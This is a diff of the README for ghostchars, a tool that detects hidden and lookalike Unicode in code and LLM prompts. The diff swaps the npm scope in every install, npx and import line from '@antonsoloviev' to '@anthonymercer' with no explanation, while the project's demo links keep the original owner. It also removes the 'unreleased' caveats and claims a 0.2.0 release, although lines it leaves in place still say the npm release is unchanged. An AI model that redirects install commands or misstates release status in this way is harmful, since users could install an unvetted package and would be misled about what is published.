@@ -2,7 +2,7 @@
 
 **See the characters you can't.** Catch invisible and deceptive Unicode in code, docs, and LLM prompts.
 
-[![npm](https://img.shields.io/npm/v/@antonsoloviev/ghostchars)](https://www.npmjs.com/package/@antonsoloviev/ghostchars)
+[![npm](https://img.shields.io/npm/v/@anthonymercer/ghostchars)](https://www.npmjs.com/package/@anthonymercer/ghostchars)
 [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![Live demo](https://img.shields.io/badge/demo-the%20UV%20lamp-8f73ff)](https://antonsoo.github.io/ghostchars/)
 
@@ -10,7 +10,7 @@
 
 ## What it found in 83,494 public prompts
 
-Run over public rules files, skills, system prompts, jailbreak collections and two attack games, the study found text hidden in tag characters or variation selectors in 3 of 83,494 documents, all in one jailbreak repository and none in the 5,718 rules, skill and sub-agent files; ghostchars 0.1.5 decoded 2 of the 4 payloads. It reported 18,390 findings in 401 documents, and by hand-reading them, 53% were neither hidden nor disguised text (94.7% once one obfuscated jailbreak is set aside): pasted no-break spaces, Turkish and Persian orthography, bold-letter LinkedIn skills. It also missed an instruction override typeset in small capitals and a jailbreak typeset in circled letters. The checkout (unreleased) adds a `styled-text` rule that reads such passages out, decodes payloads nested inside payloads and one-bit-per-word payloads, stops reporting ordinary Turkish, Russian and Greek words, and has `--format summary`. Documents with an error-level finding fall from 57 to 15. Counts, labels and the held-out check: [`studies/prompt-census`](studies/prompt-census/README.md).
+Run over public rules files, skills, system prompts, jailbreak collections and two attack games, the study found text hidden in tag characters or variation selectors in 3 of 83,494 documents, all in one jailbreak repository and none in the 5,718 rules, skill and sub-agent files; ghostchars 0.1.5 decoded 2 of the 4 payloads. It reported 18,390 findings in 401 documents, and by hand-reading them, 53% were neither hidden nor disguised text (94.7% once one obfuscated jailbreak is set aside): pasted no-break spaces, Turkish and Persian orthography, bold-letter LinkedIn skills. It also missed an instruction override typeset in small capitals and a jailbreak typeset in circled letters. 0.2.0 adds a `styled-text` rule that reads such passages out, decodes payloads nested inside payloads and one-bit-per-word payloads, stops reporting ordinary Turkish, Russian and Greek words, and has `--format summary`. Documents with an error-level finding fall from 57 to 15. Counts, labels and the held-out check: [`studies/prompt-census`](studies/prompt-census/README.md).
 
 ## Why this exists
 
@@ -25,11 +25,11 @@ ghostchars combines these detectors in a library, standalone CLI and browser ins
 ## Quickstart
 
 ```sh
-npx @antonsoloviev/ghostchars .
+npx @anthonymercer/ghostchars .
 ```
 
 That runs the published package
-([`@antonsoloviev/ghostchars`](https://www.npmjs.com/package/@antonsoloviev/ghostchars)
+([`@anthonymercer/ghostchars`](https://www.npmjs.com/package/@anthonymercer/ghostchars)
 on npm; the command it installs is `ghostchars`). The unscoped `ghostchars`
 package on npm is a different, unrelated project.
 
@@ -51,7 +51,7 @@ node dist/cli.js .
 - **pre-commit hook** (`.pre-commit-hooks.yaml`).
 - **Web app**, "the UV lamp": paste text, watch hidden characters glow, entirely client-side (the page's Content-Security-Policy, `connect-src 'self'`, has the browser refuse to send the text anywhere). <https://antonsoo.github.io/ghostchars/>
 
-**Code scans (source CLI/library, unreleased):** `ghostchars src --code` checks
+**Code scans:** `ghostchars src --code` checks
 short names, styled letters, canonical variants and same-script lookalikes that
 the ordinary text policy deliberately leaves quiet. Sixteen runnable JavaScript
 examples previously scanned clean despite holding distinct bindings with equal
@@ -60,7 +60,7 @@ Use `isCode: true` in the library or a matching file override. Default text scan
 remain unchanged across 83,494 pinned public documents. The browser keeps the
 ordinary text policy. [Examples, configuration and limits](studies/code-confusables/README.md).
 
-**Parsed JavaScript inspection (source CLI/library, unreleased):**
+**Parsed JavaScript inspection:**
 `ghostchars file.mjs --javascript module` compares the identifier names JavaScript
 reads, including Unicode escapes. It keeps exact source spans, excludes comments
 and string contents from identifier comparisons, and reports invalid syntax as
@@ -69,7 +69,7 @@ do not import that parser. [Native binding examples and limits](studies/javascri
 
 ## What it detects
 
-The source checkout uses Unicode 17's security mappings, including revised
+Since 0.2.0, ghostchars uses Unicode 17's security mappings, including revised
 lookalikes that the previous table missed. A runnable JavaScript fixture with
 `apple` and an all-Cyrillic lookalike previously scanned clean; it now reports
 the distinct bindings as confusable. The update also removes an obsolete
@@ -78,14 +78,12 @@ collision and leaves identifier text unchanged during repair. See the
 This update is in source and the public demo. The npm registry release remains
 unchanged. [Current hosted-byte check](studies/code-confusables/results/existing-demo-bytes.json).
 
-The source checkout also catches **accented cross-script lookalikes** that the
-previous scanner missed entirely. A runnable JavaScript example returned a
+It also catches **accented cross-script lookalikes** that earlier versions
+missed entirely. A runnable JavaScript example returned a
 clean scan despite declaring two visually confusable, distinct variables.
 [Before/after CLI output, independent ICU checks and the public-text replay](studies/canonical-confusables/README.md)
 show the correction and its limits. Canonically equivalent prose spellings
-stay quiet; identifier text is never automatically renamed. This correction
-is available from source. The linked verification covers local builds and
-installed artifacts; no npm release was made for this change.
+stay quiet; identifier text is never automatically renamed.
 
 | # | Rule ID(s) | Catches | Severity |
 |---|---|---|---|
@@ -95,7 +93,7 @@ installed artifacts; no npm release was made for this change.
 | 4 | `invisible` | Any `Default_Ignorable_Code_Point` character without a legitimate emoji-ZWJ or script-joining context (a ZWJ/ZWNJ after an Indic virama, such as a Malayalam chillu, counts as one) | warning |
 | 5 | `confusable` | Words that mix scripts beyond what UTS #39 allows and hold a lookalike (`paypal` with a Cyrillic letter, U+0430, for its `a`), or that reduce to the same TR39 "skeleton" as a different spelling elsewhere in the file | warning / error |
 | 6 | `unusual-whitespace`, `control-character` | NBSP/em-space/ideographic-space-etc. standing in for a normal space (French typography's no-break space before `; : ! ?` and inside `« »` is allowed, and so is the ideographic space next to Chinese, Japanese or Korean text), the braille pattern blank outside braille text (it looks like a space but isn't whitespace), and C0/C1 controls (especially ESC, which enables terminal escape injection) | warning / warning-or-error |
-| 7 | `styled-text` (source checkout, unreleased) | Passages of letters from the mathematical, fullwidth, circled, squared and small-capital alphabets, reported with the plain text they read as (`decoded`): a model reads that text, a match on code points does not | warning |
+| 7 | `styled-text` | Passages of letters from the mathematical, fullwidth, circled, squared and small-capital alphabets, reported with the plain text they read as (`decoded`): a model reads that text, a match on code points does not | warning |
 
 Run `ghostchars reveal <file>` to see all of this rendered inline, e.g. an override character shows as:
 
@@ -109,17 +107,17 @@ Run `ghostchars reveal <file>` to see all of this rendered inline, e.g. an overr
 # Scan the current directory (git-tracked files, or a plain walk outside a repo)
 ghostchars .
 
-# One line per kind of finding in each file, with what any payload decodes to (source checkout, unreleased)
+# One line per kind of finding in each file, with what any payload decodes to
 ghostchars . --format summary
 
-# Review identifier collisions without the prose exemptions (source checkout)
+# Review identifier collisions without the prose exemptions
 ghostchars src --code
 
 # CI-friendly formats
 ghostchars . --format sarif > ghostchars.sarif
 ghostchars . --format github        # ::error file=...,line=...::... annotations
 
-# Safe report-file output (source checkout, unreleased)
+# Safe report-file output
 ghostchars . --format sarif --output ../ghostchars.sarif
 
 # See (and fix) what's hiding
@@ -128,42 +126,41 @@ ghostchars . --fix --dry-run        # preview
 ghostchars . --fix                  # normalize whitespace and apply other configured repairs
 ```
 
-Directory arguments are literal filesystem paths in the source checkout.
+Directory arguments are literal filesystem paths.
 `ghostchars 'docs*' --fix` repairs the directory actually named `docs*`; it
 does not also repair `docs-old`. Leading colons no longer turn a directory
 name into Git pathspec syntax that can select unrelated files or skip every
 input. Shell expansion still happens before the CLI receives arguments; quote
 special names. Git ignore rules continue to apply to directory scans.
 [Before/after scan and repair evidence](studies/literal-directories/README.md)
-includes exact hashes of selected, ignored and unrelated files. This correction
-is not yet in the npm release.
+includes exact hashes of selected, ignored and unrelated files.
 
-The source checkout's default terminal report shows a short excerpt around
+The default terminal report shows a short excerpt around
 **every** finding, with `[[...]]` marking its exact source span. Locations use
 the original UTF-16 columns and exclusive end positions; long excerpts and
 diagnostic text declare their omissions. This avoids repeatedly scanning and
 printing whole lines: a recorded 97 KB document previously produced 91 MB of
 output. Full findings remain available in `--format json`; `--format summary`
 still groups repeated findings. [Before/after output and installed checks](studies/pretty-preview/README.md)
-cover this source-only change. npm 0.1.5 has not been updated with it.
+cover this change.
 
-The source checkout includes an **unreleased repair fix**: `--fix` now honors
+Since 0.2.0, `--fix` honors
 the same rules, allowlist and matching file overrides as the scan, including
 later passes. Its preview shows the actual proposed text; invalid encodings or
 invalid explicit configuration stop with exit 2 instead of being rewritten.
 See [repair behavior and before/after evidence](studies/repair-policy/README.md).
 
-CLI repair in the source checkout also preserves whitespace boundaries.
+CLI repair also preserves whitespace boundaries.
 Unusual spaces become ASCII spaces; NEL and Unicode line/paragraph separators
 become newlines. Deleting a no-break space used to turn `return false` into
 `returnfalse`. Deleting a Unicode line separator after a JavaScript comment
 could comment out the next statement and turn a failing check into a green
 exit. [Native before/after CLI execution](studies/whitespace-repair/README.md)
 retains those reproductions. Allowlisted and disabled findings stay protected;
-previews show the actual proposed text. This correction is not in the npm release.
+previews show the actual proposed text.
 
-Registered Unicode variants also survive scans and repairs in the source
-checkout. Previously, `--fix` removed valid selectors from slashed zero,
+Registered Unicode variants also survive scans and repairs. Through 0.1.5,
+`--fix` removed valid selectors from slashed zero,
 mathematical symbols, CJK punctuation and script variants while claiming they
 were unregistered. Exact Unicode 17 pairs now come from the pinned normative
 table. Unsupported pairs and encoded payloads still produce findings.
@@ -172,16 +169,15 @@ cover the correction. These variants also survive the current public demo;
 the npm registry release remains unchanged.
 
 
-The source checkout also reports **incomplete scans** separately from clean
+ghostchars also reports **incomplete scans** separately from clean
 results. Unreadable files, failed directory/Git enumeration and decoding errors
 return exit 2, with details in every report format. Discovered symbolic links
 are listed as exclusions and never followed by `--fix`; an explicitly named
 link asks for the real target path. [Filesystem reproductions and installed
 CLI verification](studies/discovery-evidence/README.md) retain the before/after
-results. These changes have not been released to npm.
+results.
 
-Dense bidi controls also avoid repeated full-stack searches in the source
-checkout. A controlled 192 KB file scanned in 0.28 seconds versus 2.78 seconds
+Dense bidi controls also avoid repeated full-stack searches. A controlled 192 KB file scanned in 0.28 seconds versus 2.78 seconds
 before the change; repair took 0.43 seconds versus 8.59 seconds, retaining
 identical findings and repaired bytes. These are local single-run observations,
 not production traffic or portable timing guarantees. [Reproduction, complete
@@ -190,11 +186,11 @@ output comparisons and offline browser evidence](studies/bidi-scaling/README.md)
 ### As an LLM input filter
 
 ```sh
-npm install @antonsoloviev/ghostchars
+npm install @anthonymercer/ghostchars
 ```
 
 ```ts
-import { sanitize, scanText } from '@antonsoloviev/ghostchars';
+import { sanitize, scanText } from '@anthonymercer/ghostchars';
 
 const userInput = await getUntrustedText();
 const { findings } = scanText(userInput);
@@ -205,8 +201,7 @@ const { text: clean, remaining } = sanitize(userInput); // review both before us
 ```
 
 Removal is textual: it can join words, change typography or affect code. It does
-not establish that a prompt is trustworthy. The source checkout also accepts
-`sanitize(text, { scanOptions: { allowCodePoints: [0xA0], severityOverrides:
+not establish that a prompt is trustworthy. The library also accepts `sanitize(text, { scanOptions: { allowCodePoints: [0xA0], severityOverrides:
 { invisible: false } } })` to apply the same policy on every pass.
 Use `sanitize(text, { mode: 'normalize' })` to retain word and line boundaries
 when replacing unusual whitespace; the CLI uses that mode. Default and explicit
@@ -224,7 +219,7 @@ comments and language-specific whitespace before applying them.
 
 See [`examples/workflows/ghostchars.yml`](examples/workflows/ghostchars.yml) and [`examples/workflows/ghostchars-sarif.yml`](examples/workflows/ghostchars-sarif.yml) (code-scanning upload) for full workflow files.
 
-The Action's `output` input now uses the source CLI's `--output` writer. It
+The Action's `output` input now uses the CLI's `--output` writer. It
 refuses paths that overlap selected inputs or the Ghostchars configuration,
 including hard-link aliases, and refuses symbolic-link output files. Reports
 are written after scanning to a private temporary file beside the destination,
@@ -235,17 +230,16 @@ An existing report inside a selected directory must be ignored or moved outside
 that directory; it is not silently excluded from scanning.
 
 Shell `>` redirection opens its destination before the CLI starts and cannot
-receive these protections. Use `--output` from a source build, or the Action's
+receive these protections. Use `--output` (0.2.0 and later), or the Action's
 `output` input. Reports use mode 0600 on POSIX and replace the inode without
 preserving old report metadata. A report-write failure does not undo completed
 `--fix` repairs; notices of concurrent changes are checked, but this is not a
 filesystem sandbox or a power-loss durability guarantee.
 [Actual Action-body, alias and kernel write-failure replay](studies/action-reports/README.md).
-The npm release has not yet gained `--output`.
 
 ### Config (`.ghostcharsrc.json`)
 
-The `isCode` settings below require a source build; npm 0.1.5 predates this option.
+The `isCode` settings below need 0.2.0 or later.
 
 ```json
 {
@@ -259,21 +253,19 @@ The `isCode` settings below require a source build; npm 0.1.5 predates this opti
 }
 ```
 
-In the source checkout, `allow` protects each listed Unicode scalar even inside
+`allow` protects each listed Unicode scalar even inside
 a compound finding. A disabled rule cannot remove text, but another enabled rule
 may still cover the same character; disabling `bidi-control` alone does not
 disable `bidi-unbalanced`. Severity changes (`info`, `warning`, `error`) change
 reporting, not whether an enabled fixable rule can remove its characters.
-All matching overrides merge in order; allowlists accumulate. In the source
-checkout, `isCode` selects the confusable policy globally or per matching path;
+All matching overrides merge in order; allowlists accumulate. `isCode` selects the confusable policy globally or per matching path;
 a later `false` restores the text policy. `--code` explicitly selects code mode
 for every scanned file, overriding configuration. This also works in the GitHub
 Action through its `config` input; no registry install is involved.
 
 `--fix` reports findings from the **original** scan: exit 1 means error-level
 findings, while exit 2 takes precedence for input or repair failures. Run a
-second scan to check what remains. In the source checkout, discovery and reading
-finish before any write; an input failure blocks every planned repair. A later
+second scan to check what remains. Discovery and reading finish before any write; an input failure blocks every planned repair. A later
 repair is written to an exclusive temporary file in the original's directory,
 flushed, and renamed over the original only after **all** replacements have been
 prepared. A failed staging write leaves every original untouched; a later rename
@@ -361,14 +353,13 @@ can be removed while preserving the flag; other repairs keep the visible carrier
 ### Variation-selector smuggling (rule 3)
 
 `decodeVariationSelectors()` maps VS1-16 (U+FE00-FE0F) to bytes 0-15 and
-VS17-256 (U+E0100-E01EF) to bytes 16-255. In this source checkout, a single
-selector is ordinary only for an exact standardized/IVD pair or the existing
+VS17-256 (U+E0100-E01EF) to bytes 16-255. A single selector is ordinary only for an exact standardized/IVD pair or the existing
 VS15/VS16 emoji presentation policy. CJK block membership alone no longer
 exempts it. Adjacent unregistered carriers can encode one UTF-8 byte each;
 streams of at least eight clean-text bytes are decoded together, with the
 message on the first finding. Registered variants and source gaps break the
 chain. [Before/after CLI, registration oracle and corpus replay](studies/ideographic-selectors/README.md)
-retain the correction and its boundaries; no npm release is included.
+retain the correction and its boundaries.
 
 ### Invisible characters (rule 4)
 
@@ -376,8 +367,8 @@ Driven directly by the `Default_Ignorable_Code_Point` property rather than a han
 
 ### Confusables (rule 5)
 
-Uses UTS #39's prototype mappings for identifier-shaped tokens. In this source
-checkout, canonical decomposition (NFD) runs before and after that mapping,
+Uses UTS #39's prototype mappings for identifier-shaped tokens. Canonical
+decomposition (NFD) runs before and after that mapping,
 so accents and combining order cannot hide a collision. The default is a
 prose-aware subset, not a complete UTS #39 conformance implementation. Code mode
 uses Unicode identifier properties (plus `$`, `_`, ZWJ and ZWNJ), includes short
@@ -397,10 +388,10 @@ A fixed list of Unicode space separators and line/paragraph separators that aren
 
 - **A confusable/skeleton collision requires at least one non-ASCII side.** Two pure-ASCII spellings that happen to share a TR39 skeleton (`rn`/`m`, `l`/`1`/`I`, `O`/`0`) are a font-rendering ambiguity, not the cross-script Unicode attack this tool targets -- and English prose is full of them by accident (an early draft of this README tripped over "CI" vs. "C0/C1" reducing to the same skeleton). Flagging those would be noise, not signal, so ghostchars only reports a collision when at least one spelling contains a non-ASCII character -- the actual homoglyph-attack shape (a genuine ASCII `admin` next to the same word with one letter swapped for a Cyrillic lookalike, U+0430 in place of "a").
 - **Measured on real multilingual text.** Sixty translated documents from two public repositories (the `free-programming-books` lists in 42 languages and the `javascript-algorithms` README in 18: Arabic, Hebrew, Persian, Hindi, Tamil, Thai, Japanese, Chinese, Korean, Russian and more) produced 279 findings in 23 files before 0.1.4: 240 "mixed script" warnings on Latin terms inside Japanese, Chinese and Korean sentences, and 11 collision errors, most between ordinary Hebrew words (vav and final nun both reduce to `l`). They produce 29 now, each one a real character: 16 doubled variation selectors after a heart emoji, 8 stray zero-width spaces, soft hyphens and a misplaced ZWNJ, a no-break space, and a Russian word spelled with a Latin `c`, which is the thing this rule exists to find.
-- **Two words of one non-Latin script that share a skeleton are not reported.** `confusables.txt` folds lookalikes inside a script too, so ordinary text collides with itself. Latin is the exception, since its own non-ASCII lookalikes (a dotless i, U+0131; a fullwidth letter) are how an ASCII name is imitated without leaving the script; the price was that Turkish text, where the question particle is written both with a dotted and with a dotless i, was reported (see the `node_modules` breakdown below). In the source checkout (unreleased) a file with ten or more distinct words containing a dotless i, or ten or more distinct words of one Cyrillic or Greek script, is taken to be written in that language and its words are not reported as imitating a Latin word; fewer than ten are still reported. Measured in [`studies/prompt-census`](studies/prompt-census/README.md).
+- **Two words of one non-Latin script that share a skeleton are not reported.** `confusables.txt` folds lookalikes inside a script too, so ordinary text collides with itself. Latin is the exception, since its own non-ASCII lookalikes (a dotless i, U+0131; a fullwidth letter) are how an ASCII name is imitated without leaving the script; the price was that Turkish text, where the question particle is written both with a dotted and with a dotless i, was reported (see the `node_modules` breakdown below). Since 0.2.0, a file with ten or more distinct words containing a dotless i, or ten or more distinct words of one Cyrillic or Greek script, is taken to be written in that language and its words are not reported as imitating a Latin word; fewer than ten are still reported. Measured in [`studies/prompt-census`](studies/prompt-census/README.md).
 - **Tokenization is regex-based, not an AST.** The confusables rule treats any `\p{L}\p{M}\p{Nd}\p{Pc}`-shaped run as an "identifier," including words inside comments, string literals, and plain prose -- it will flag `admin` written twice in a docstring next to its Cyrillic lookalike, the same as it would in real code.
 - **A single character type is sometimes both a real signal and commonly legitimate at once.** NBSP is the clearest case: French typography requires it before `:`/`;`/`!`/`?`, so any French-localized string will contain plenty of "findings" that are correct detections of a real, intentional NBSP -- not an attack. This is a known, honest trade-off of not being format-aware (see the `node_modules` breakdown below); `.ghostcharsrc.json` per-glob overrides exist specifically to quiet a known-legitimate path (e.g. a translations directory) without touching the default elsewhere.
-- **Registration is not a safety verdict.** The source checkout checks exact IVD pairs and preserves registered variants, whose choices can themselves carry information. It does not establish font support, author intent or whether a model will follow hidden text. Emoji VS15/VS16 recognition retains its broader presentation policy.
+- **Registration is not a safety verdict.** ghostchars checks exact IVD pairs and preserves registered variants, whose choices can themselves carry information. It does not establish font support, author intent or whether a model will follow hidden text. Emoji VS15/VS16 recognition retains its broader presentation policy.
 - **The bidi-balance check is per-line by design** (see above); a payload that only becomes unbalanced when reasoned about across an entire multi-line paragraph, rather than within one rendered line, is out of scope.
 - Every detector was checked against an independent oracle where one exists: bidi/tag/variation-selector/invisible ranges are cross-checked against literal code points from the Unicode spec text (not re-derived from the generated tables), and the confusables skeleton is verified against `confusables.txt` entries directly (see `tests/`).
 
